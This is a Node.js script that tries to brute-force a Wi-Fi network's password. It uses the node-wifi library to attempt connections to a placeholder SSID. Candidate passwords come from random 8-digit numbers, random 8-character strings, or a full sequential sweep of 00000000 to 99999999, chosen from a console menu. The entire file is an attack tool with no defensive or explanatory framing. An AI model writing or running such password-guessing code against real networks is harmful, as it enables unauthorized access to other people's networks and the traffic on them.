const wifi = require('node-wifi');
const readline = require('readline');
const crypto = require('crypto');

// Initialize wifi module
wifi.init({
  iface: null // network interface, choose a random wifi interface if set to null
});

// Function to attempt connection
const attemptConnection = (ssid, password) => {
  return new Promise((resolve, reject) => {
    wifi.connect({ ssid, password }, error => {
      if (error) {
        resolve(false); // Resolve false on failure
      } else {
        resolve(true); // Resolve true on success
      }
    });
  });
};

// Function to generate random passwords
const generateRandomPasswords = (length, count) => {
  const passwords = [];
  for (let i = 0; i < count; i++) {
    const password = crypto.randomBytes(length).toString('base64').slice(0, length);
    passwords.push(password);
  }
  return passwords;
};

// Function to generate random numbers
const generateRandomNumbers = (count) => {
  const numbers = [];
  for (let i = 0; i < count; i++) {
    const number = Math.floor(Math.random() * 100000000).toString().padStart(8, '0');
    numbers.push(number);
  }
  return numbers;
};

// Function to generate sequential numbers
const generateSequentialNumbers = () => {
  const numbers = [];
  for (let i = 0; i <= 99999999; i++) {
    numbers.push(i.toString().padStart(8, '0'));
  }
  return numbers;
};

// Function to connect to WiFi using random passwords
const connectToWifi = async (ssid, passwords) => {
  for (const password of passwords) {
    console.log(`Trying password: ${password}`);
    const connected = await attemptConnection(ssid, password);
    if (connected) {
      console.log(`Successfully connected with password: ${password}`);
      return;
    }
  }
  console.log('Failed to connect with any of the provided passwords.');
};

// Function to display menu and get user input
const showMenu = () => {
  console.log(`
  Please choose an option:
  1. Generate random numbers
  2. Generate random 8-character passwords
  3. Try sequential numbers from 00000000 to 99999999
  `);
};

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Main function
const main = async () => {
  const ssid = 'SSID';
  showMenu();
  rl.question('Enter your choice: ', async (choice) => {
    switch (choice) {
      case '1':
        const randomNumbers = generateRandomNumbers(100);
        await connectToWifi(ssid, randomNumbers);
        break;
      case '2':
        const randomPasswords = generateRandomPasswords(8, 100);
        await connectToWifi(ssid, randomPasswords);
        break;
      case '3':
        const sequentialNumbers = generateSequentialNumbers();
        await connectToWifi(ssid, sequentialNumbers);
        break;
      default:
        console.log('Invalid choice');
        break;
    }
    rl.close();
  });
};

main();
